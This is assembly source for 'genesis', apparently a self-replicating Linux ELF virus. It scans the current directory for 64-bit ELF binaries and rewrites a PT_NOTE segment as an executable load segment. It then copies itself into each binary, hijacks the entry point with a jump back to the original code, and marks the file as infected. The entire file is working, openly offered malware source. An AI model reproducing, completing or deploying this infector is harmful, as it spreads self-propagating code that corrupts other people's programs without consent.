;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
;@;                                                           genesis.asm ;@;
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;

; assemble
; nasm -f elf64 genesis.asm -o genesis.o
; ld genesis.o -o genesis

%include "src/Macros.asm"
%include "src/Structs.asm"

global _start
_start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  ;; SAVE REGS >------------------------------------------------------------<

  pushfq
  PushAll

  ;; SAVE ARGV >------------------------------------------------------------<

  mov   r15,  rsp

  ;; ENUM FILES >-----------------------------------------------------------<

  push  "."
  Open  rsp,  O_RDONLY, 0x00                        ; rax = Open(".", 0, 0)

  test  rax,  rax                                   ; if (rax < 0)
  jl    VExitRoutine                                ;   exit()

  sub   rsp,  0x10                                  ; alloc 4 elf_magic
  push  rax                                         ; save fd
  push  0x00                                        ; bytes read
  sub   rsp,  SZ_DENT

  .EnumDir:
    GetDents64 [rsp + SZ_DENT + 8], rsp, SZ_DENT    ; GetDents64(fd, buf, buflen)
    cmp   rax,  0x00
    jle   .EnumDirDone

    xor   r9,   r9                                  ; Counter   = 0
    mov   [rsp + SZ_DENT],  rax                     ; EndCount  = rax
  
    .EnumFiles:
      cmp   byte [rsp + r9 + linux_dirent64.d_type], DT_REG
      jne   .NextIteration

      ;; GET FILE >---------------------------------------------------------<
    
      lea   r13, [rsp + r9 + linux_dirent64.d_name]

      Open  r13,  O_RDWR, 0x00
      test  rax,  rax
      js   .NextIteration
  
      mov   rbx,  rax   ; save fd
    
      lea   r14,  [rsp + SZ_DENT + 16]
      Read  rbx,  r14, 0x10
      cmp   rax,  0x10
      jne   .NextFile

      ;; CHECK IF ELF >-----------------------------------------------------<
    
      cmp   dword [r14], ELF_MAGIC
      jne   .NextFile

      ;; CHECK ALREADY INFECTED >-------------------------------------------<

      mov   eax, dword [r14 + 0xC]
      cmp   eax, 0x534e4700                           ; Check for "GNS" in Padding
      je    .NextFile                                 ; Already Infected
    
      ;; INFECT FILE >------------------------------------------------------<

      push  rbx                                       ; Save FD
      call  Infect                                    ; Try to infect file
      cmp   rax,  0x00                                ; if no success --.
      pop   rbx                                       ; Get FD back     |
      jne   .NextFile                                 ; <---Next-File---'

      ;; EXEC PAYLOAD (PRINT STDOUT) >--------------------------------------<

      call .Payload
    
        MSG_PLACEHOLDER
        msglen equ $-.msg

      .Payload:
      pop   rsi
      Write STDOUT, rsi, msglen

      Close rbx

      jmp   .EnumDirDone

    .NextFile:
      Close rbx

    .NextIteration:
      add   r9w, word [rsp + r9 + linux_dirent64.d_reclen]  ; len
      cmp   r9w, word [rsp + SZ_DENT]                       ; bytes_read
      jl    .EnumFiles

    jmp   .EnumDir

.EnumDirDone:
  add     rsp,  SZ_DENT
  pop     rdi
  Close   [rsp]
  mov     rsp,  r15
  PopAll
  popfq
  jmp     VExitRoutine

Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  push    rbp
  mov     rbp,  rsp
  sub     rsp,  0x90 

  ;; STAT + MMAP >----------------------------------------------------------<
  
  FStat   rdi,  rsp
  test    rax,  rax
  jne     .InfectFailureExit
  
  ; extend filesize (ftruncate)
  xor     rbx,  rbx
  mov     rbx,  VExitRoutine
  mov     rax,  _start
  sub     rbx,  rax

  mov     r10,  [rsp + stat.st_size]                ; save copy :)

  add     rbx,  [rsp + stat.st_size]                ; host + vx
  add     rsp,  0x90                                ; free stack

  ; align to page size
  add     rbx,  0xFFF                               ; add page_size-1
  and     rbx,  -0x1000

  xor     rsi,  rsi
  FTruncate     rdi,  rbx
  test    rax,  rax
  jne     .InfectFailureExit

  sub     rsp,  0x28
  push    rbx
  push    r10
  push    r9
  push    rdi

  ; Mmap(...)
  MMap    rbx,  PROT_READWRITE, [rsp]

  pop     rdi                                       ; restore regs
  pop     r9
  pop     r10

  test    rax,  rax                                 ; check if mmap(...) failed
  js      .InfectFailureExit

  push    rax

  ;; SAVE OLD ENTRY >-------------------------------------------------------<
  
  ; check 64bit
  movzx   rbx,  byte [rax + 4]
  cmp     rbx,  ELF_64BIT
  jne     .InfectCleanUp

  ; check little endian
  movzx   rbx,  byte [rax + 5]
  cmp     rbx,  ELF_LENDIAN
  jne     .InfectCleanUp

  ; check architecture
  movzx   rbx,  byte [rax + elf64_hdr.e_machine]
  cmp     rbx,  ELF_AMD64
  jne     .InfectCleanUp

  ; save entry
  mov     rax,  [rax + elf64_hdr.e_entry]
  mov     [rsp + VX_CTX.qOldEntry], rax ; 0x10

  ;; LOOP THROUGH PHDR >----------------------------------------------------<

  xor     rcx,  rcx
  mov     rax,  [rsp]
  mov     rdx,  rax
  add     rax,  [rax + elf64_hdr.e_phoff]

  .ProgramHdrLoop:
    movzx   rbx,  word [rdx + elf64_hdr.e_phentsize]  ; phentsize
    imul    rbx,  rcx                                 ; phentsize * i
    
    lea     r12,  [rax + rbx]
    mov     [rsp + VX_CTX.qPrgHdr], r12               ; store prog_hdr on stack

    movzx   rbx,  word [rax + rbx]                    ; rbx = *(phoff + (phentsize * i))
    
    cmp     rbx,  PT_NOTE
    je      .ConvertPtNote
    
    inc     rcx
    cmp     cx,   word [rdx + elf64_hdr.e_phnum]
    jl      .ProgramHdrLoop

  jmp .InfectCleanUp

  ;; CONVERT TO PT_LOAD >---------------------------------------------------<

  .ConvertPtNote:
  
  mov   dword [r12 + elf64_phdr.p_type],  PT_LOAD       ; p_type
  mov   dword [r12 + elf64_phdr.p_flags], PT_FLAG_RX    ; p_flags

  mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body
  add   rcx,  SZ_JMP_OEP                                ; place 4 "jmp OEP" patch

  mov   qword [r12 + elf64_phdr.p_filesz],  rcx         ; p_filesz
  mov   qword [r12 + elf64_phdr.p_memsz],   rcx         ; p_memsz

  mov   qword [r12 + elf64_phdr.p_offset],  r10         ; p_offset

  mov   rbx,  r10                                       ; rbx = size H-Body
  mov   dword [rsp + VX_CTX.qEof], ebx
  add   rbx,  0xc000000

  mov   qword [r12 + elf64_phdr.p_vaddr],   rbx         ; p_vaddr
  mov   qword [r12 + elf64_phdr.p_paddr],   rbx         ; p_paddr
  mov   qword [r12 + elf64_phdr.p_align],   0x00        ; no alignment needed

  ;; WRITE SELF AT LOCATION >-----------------------------------------------<

  mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body

  sub   rsp,  0x8
  push  rdi

  lea   rsi,  [rel _start]                              ; src address
  mov   rdi,  [rsp + VX_CTX.qMappedBin + 0x10]  
  add   rdi,  r10                                       ; dest address
  rep   movsb

  pop   rdi
  add   rsp,  0x8
  
  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<

  ; mov   rbx,  r10
  add   r10,  0xc000000 ; was rbx not r10
  mov   dword [rdx + elf64_hdr.e_entry], r10d            ; patch entry
  
  ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<

  mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body

  mov   rbx,  [rsp]   
  add   rbx,  [rsp + VX_CTX.qEof]
  add   rbx,  rcx

  ; mov   byte  [rbx + 0],    0x48
  ; mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
  ; mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
  ; mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
  ; mov   byte  [rbx + 10],   0xFF 
  ; mov   byte  [rbx + 11],   0xE0                        ; jmp rax

  mov   dword   [rbx + 0],  0x000000e8  ; call $+5
  mov   word    [rbx + 4],  0x5800      ; pop rax   ; rax = RIP
  mov   word    [rbx + 6],  0x2d48
  add   rcx,    0x5                     ; <-- prob needs adjustment lol
  mov   dword   [rbx + 8],  ecx         ; sub rax, vx_size + 5
  mov   word    [rbx + 12], 0x2d48
  mov   dword   [rbx + 14], r10d        ; sub rax, new_entry
  mov   word    [rbx + 18], 0x0548
  mov   rcx,    [rsp + VX_CTX.qOldEntry]
  mov   dword   [rbx + 20], ecx         ; add rax, old_entry
  mov   word    [rbx + 24], 0xe0ff      ; jmp rax

  ; --> GET OEP DESPITE PIE <-----------------------------------------------< 
  ; call  $+5             ; e8 00 00 00 00    ; 
  ; pop   rax             ; 58                ; rax = RIP
  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; VX_SIZE + 5, known statically
  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; new entry (make sure to patch below so r10 += 0xc000000)
  ; add   rax, 0x???????? ; 48 05 ?? ?? ?? ?? ; rax += VX_CTX.qOldEntry
  ; jmp   rax             ; ff e0             ; 

  ;; WRITE SIGNATURE >------------------------------------------------------<
  
  mov   dword [rdx + 0xc], 0x534e4700

  ;; OVERWRITE FILE >-------------------------------------------------------<

  sub   rsp,  0x8
  push  rdi

  MSync rdx,  [rsp + VX_CTX.qFileSize - 0x10], MS_SYNC  ; msync(addr, len, MS_SYNC)

  pop   rdi
  add   rsp,  0x8

  test  rax,  rax
  js    .InfectCleanUp

  ; fsync(fd) - just to make sure
  FSync   rdi                                           ; fsync(fd)

  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file

  xor     rax,  rax                                     ; return 0
  mov     rsp,  rbp
  pop     rbp
  ret

  .InfectCleanUp:
  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file

  .InfectFailureExit:
  xor     rax,  rax                                     ; return 1
  inc     rax
  mov     rsp,  rbp
  pop     rbp
  ret

VExitRoutine: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  Exit 0x00

